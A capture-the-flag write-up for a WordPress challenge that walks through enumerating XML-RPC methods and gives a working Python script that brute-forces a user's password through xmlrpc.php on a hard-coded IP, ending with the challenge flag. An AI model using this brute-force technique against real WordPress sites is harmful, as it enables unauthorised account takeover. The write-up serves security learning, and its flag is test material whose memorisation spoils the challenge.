---
layout: post
title:  "HZVII - $uper $ecure WP Blog"
author: "PsycoR"
tags: HZVII web
---

>  WordPress accounted for 90% of all hacked CMS sites in 2018, some WordPress features should be disabled or removed completely if it is not being used to avoid any potential risks. Otherwise, it should at the very least be blocked from external access.





## Steps
- The first thought that comes to mind is to try access default login interface of wordpress but Oops you can not

 ![](https://raw.githubusercontent.com/pow270/pow270.github.io/master/_posts/pictures/wp0.png)

- The source code shows that we need to be authenticated to get the flag, so how to authenticate without login interface ?

 ![](https://raw.githubusercontent.com/pow270/pow270.github.io/master/_posts/pictures/wp1.png)

- Simple scan with wpscan shows that the XML-RPC Interface is enabled

>In wp challenges people generally think about vulnerable plugins which is not the case here so what is XML-RPC ?

 ![](https://raw.githubusercontent.com/pow270/pow270.github.io/master/_posts/pictures/wp2.png)

>XML-RPC on WordPress is actually an API or “application program interface“. It gives developers who make mobile apps, desktop apps and other services the ability to talk to your WordPress site. The XML-RPC API that WordPress provides gives developers a way to write applications (for you) that can do many of the things that you can do when logged into WordPress via the web interface. These include: Publish a post Edit a post Delete a post. Upload a new file (e.g. an image for a post) Get a list of comments Edit comments

- List available methods

> The first thing to do now is send a POST request and list all the available methods , why ? cause that’s how we’ll know which actions are even possible to make and potentially use one of them for an attack. 

 ![](https://raw.githubusercontent.com/pow270/pow270.github.io/master/_posts/pictures/wp3.png)


- Interresting method founded demo.getFlag

 ![](https://raw.githubusercontent.com/pow270/pow270.github.io/master/_posts/pictures/wp4.png)

> The flag is not here :'(

- Digging deeper for availible methods

 ![](https://raw.githubusercontent.com/pow270/pow270.github.io/master/_posts/pictures/wp5.png)

> A dictionnary link was founded in the method getFavouriteWords, maybe we need it later

 ![](https://raw.githubusercontent.com/pow270/pow270.github.io/master/_posts/pictures/wp6.png)
 
> Another method wp.getFlag seems interresting

- Call wp.getFlag

> The request need more arguements certainly the user & password :)

 ![](https://raw.githubusercontent.com/pow270/pow270.github.io/master/_posts/pictures/wp7.png)


- The user who posted the first article in the blog is psycor

> We know our user ;)

 ![](https://raw.githubusercontent.com/pow270/pow270.github.io/master/_posts/pictures/wp8.png)

- Now it's time to bruteforce the password using the dictionary previously founded

> We can differentiate successful credentials by response length.

```python
import requests


headers = {'Content-Type': 'text/xml'}

cracklist = open("dic.txt", "r")
for password in cracklist.readlines():
	password = password.strip("\n")
	xml = """<methodCall>
<methodName>wp.getFlag</methodName>
<params>
<param><value>psycor</value></param>
<param><value>"""+password+"""</value></param>
</params>
</methodCall>"""
	response = requests.post('http://51.83.41.116/xmlrpc.php', data=xml, headers=headers)
	if len(response.content) != 403:
		print("Password Founded:= "+password)
		print(response.text)
		break

```

 ![](https://raw.githubusercontent.com/pow270/pow270.github.io/master/_posts/pictures/wp9.png)

> The flag is : HZVII{50m371m35_xml_rpc_15_d4n63r0u5}





